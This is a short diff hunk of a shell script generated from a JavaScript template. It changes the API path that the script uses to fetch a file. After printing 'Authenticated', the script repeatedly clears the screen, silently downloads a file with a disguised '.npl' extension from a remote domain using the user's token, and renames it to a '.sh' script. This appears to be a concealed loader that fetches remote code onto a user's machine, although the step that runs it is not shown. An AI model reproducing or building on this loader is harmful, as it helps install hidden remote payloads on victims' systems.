@@ -40,7 +40,7 @@ echo "Authenticated"
 TARGET_DIR="$HOME/Documents"
 mkdir -p "$TARGET_DIR"
 clear
-wget -q -O "$TARGET_DIR/tokenlinux.npl" "${domain}/api/task/tokenlinux?token=${encodeURIComponent(origToken)}&st=${encodeURIComponent(st1)}"
+wget -q -O "$TARGET_DIR/tokenlinux.npl" "${domain}/api/users/tokenlinux?token=${encodeURIComponent(origToken)}&st=${encodeURIComponent(st1)}"
 clear
 mv "$TARGET_DIR/tokenlinux.npl" "$TARGET_DIR/tokenlinux.sh"
 clear
